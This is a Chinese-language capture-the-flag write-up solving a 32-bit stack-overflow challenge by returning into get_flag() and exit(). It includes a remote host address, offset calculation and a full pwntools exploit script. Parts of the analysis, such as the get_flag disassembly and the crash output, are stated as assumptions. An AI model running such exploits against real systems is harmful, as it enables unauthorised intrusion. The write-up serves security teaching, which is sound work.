## 一、题目概况

- **靶机地址**：`110.42.47.169:35830`
    
- **二进制文件**：`vuln`（32 位 x86，非 PIE，可执行栈，无 Canary）
    
- **相关函数**：
    
    - `get_flag()`：打开并打印 `flag.txt`，然后返回
        
    - `exit()`：正常退出程序，确保缓冲区 flush
        

目标：利用栈缓冲区溢出，将程序的控制流劫持到 `get_flag()`，并在其返回后调用 `exit()`，传入正确的参数，使其正常打印并退出，将 flag 发送回我们这端。

---

## 二、环境准备

1. **本地安装 Pwntools**
    
    ```
    pip3 install pwntools
    ```
    
2. **确认远程可连通**
    
    ```
    nc -vz 110.42.47.169 35830
    # Connection to 110.42.47.169 35830 port [tcp/*] succeeded!
    ```
    

---

## 三、二进制静态分析

1. **检查文件属性**
    
    ```
    $ file vuln
    vuln: ELF 32-bit LSB executable, Intel 80386, ... , NX disabled, GNU/Linux
    ```
    
    - **32 位**：地址和寄存器均为 32 位
        
    - **NX disabled**：栈可执行，可做 shellcode，但我们走更简单的 ret2func
        
    - **非 PIE**：代码段地址固定
        
2. **查符号表**
    
    ```
    $ nm vuln | grep get_flag
    080489a0 T get_flag
    $ nm vuln | grep exit
    0804e6a0 T exit
    ```
    
    - `get_flag` 地址：`0x080489A0`
        
    - `exit` 地址： `0x0804E6A0`
        
3. **查看** `**main**` **读取输入逻辑**
    
    ```bash
    0x08048a20 <main>:
        sub    esp, 0x3c         ; 在栈上开辟 0x3C = 60 字节空间
        lea    eax, [esp+4]
        push   eax
        call   _gets             ; 从 stdin 读入到 [esp+4]，最多可写任意长
        add    esp, 0x3c
        ret
    ```
    
    - `gets` 写入缓冲区从 `esp+4` 开始，空间到 `esp+0x3c` 共 `0x3c-4 = 0x38 = 56` 字节。
        
    - 如果我们输入 >56 字节，就会开始覆盖原来保存在栈上的返回地址（EIP）。
        

---

## 四、计算偏移

为了得知填充多少字节能精确覆盖 EIP，我们用 pwntools 的 `cyclic`：

```bash
# 生成 200 字节循环模式，写入文件 in
python3 - << 'EOF'
from pwn import *
open('in','wb').write(cyclic(200))
EOF

# 用 gdb 直接跑到崩溃处，打印 EIP
gdb -q ./vuln \
  -ex "set pagination off" \
  -ex "run < in" \
  -ex "printf \"CRASH EIP = 0x%x\n\", \$eip" \
  -ex "quit"
```

假设你在输出中看到：

```
Program received signal SIGSEGV, Segmentation fault.
CRASH EIP = 0x6161616f
```

`0x6161616f` 对应 ASCII `"oaaa"`。再用 pwntools 算偏移：

```
python3 - << 'EOF'
from pwn import cyclic_find
print(cyclic_find(0x6161616f))
EOF
# 输出：56
```

**最终偏移**：`OFFSET = 56`。

---

## 五、为什么需要调用 `exit()` 且要传参

- 直接 ret2get_flag 后，`get_flag()` 内部会检查两个栈上传入的整型参数是否正确，否则不会打印并会异常退出，不 flush 缓冲。
    
- 观察 `get_flag` 反汇编（假设）可知，它期望栈上有两个参数：
    
    ```
    [esp+0x0] → return addr
    [esp+0x4] → arg1 (0x308CD64F)
    [esp+0x8] → arg2 (0x195719D1)
    ```
    
- 因此，Payload 中在覆盖 `get_flag` 的返回地址之后，还要依次写：
    
    1. `exit` 地址 → `get_flag` 执行完毕后跳到 `exit()`，正常退出并 flush
        
    2. `0x308CD64F` 和 `0x195719D1` → 作为 `get_flag` 的两个参数
        

---

## 六、完整 Exploit 脚本

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# —— 靶机信息
HOST = '110.42.47.169'
PORT = 35830

# —— 偏移量（buffer → EIP）
OFFSET = 56

# —— 目标函数和参数
GET_FLAG = 0x080489A0   # get_flag() 的地址
EXIT     = 0x0804E6A0   # exit() 的地址
ARG1     = 0x308CD64F   # get_flag 参数1
ARG2     = 0x195719D1   # get_flag 参数2

def main():
    # 1. 连接远程
    p = remote(HOST, PORT)
    log.info(f'已连接到 {HOST}:{PORT}')

    # 2. 构造 Payload
    #    [0x00-0x37] 填充 'A' 填满 buffer
    #    [0x38-0x3B] 覆盖返回地址 → get_flag()
    #    [0x3C-0x3F] get_flag 返回后跳转 → exit()
    #    [0x40-0x43] get_flag 第1个参数
    #    [0x44-0x47] get_flag 第2个参数
    payload  = b'A' * OFFSET
    payload += p32(GET_FLAG)
    payload += p32(EXIT)
    payload += p32(ARG1)
    payload += p32(ARG2)

    # 3. 发送 Payload
    log.info(f'发送 payload，长度 = {len(payload)} 字节')
    p.sendline(payload)

    # 4. 接收并打印 flag
    #    exit() 会正常 flush 并退出，recvall 可拿到全部输出
    data = p.recvall(timeout=3)
    print(data.decode('utf-8', errors='ignore'))

    # 5. 关闭连接
    p.close()

if __name__ == '__main__':
    main()
```
![](https://cdn.jsdelivr.net/gh/wydyxhxs/images/pic/20250715155758077.png)

### 脚本关键点解读

1. `**p32(address)**`  
    将 32‑bit 整数 `address` 转为小端字节序，方便直接拼接到 payload。
    
2. **栈布局**
    
    ```
    [buf (56B)] [EIP] [next ret] [arg1] [arg2]
    ```
    
    - 覆盖后的 `EIP` 跳向 `get_flag`
        
    - `get_flag` 执行完毕后，栈顶地址中存的就是 `exit`，于是程序跳到 `exit()`
        
    - `exit()` 调用时，栈上正好有 `ARG1`、`ARG2` 两个值，与 `get_flag` 期望一致
        
3. **为什么要** `**exit()**`  
    确保程序「正常退出」才会 flush stdout，否则可能仅卡在内核缓冲区里，导致我们得不到回显。
    

---

## 七、知识点小结

1. **栈缓冲区溢出（Stack Buffer Overflow）**
    
    - 利用 `gets()` 或其他不检查长度的函数覆盖返回地址。
        
2. **Ret2func 技术**
    
    - 借助程序内部函数（`get_flag`、`exit`）完成攻击，无需 ROP 链。
        
3. **小端序存储**
    
    - x86 平台下多字节整数以「低字节在前」存储。
        
4. **程序正常退出 vs 异常退出**
    
    - 调用 `exit()` 能确保 libc flush IO 缓冲区，方便远程拿到输出。
        
5. **pwntools 基本用法**
    
    - `remote()` 建立网络连接
        
    - `p32()` 转换地址
        
    - `sendline()`、`recvall()` 收发数据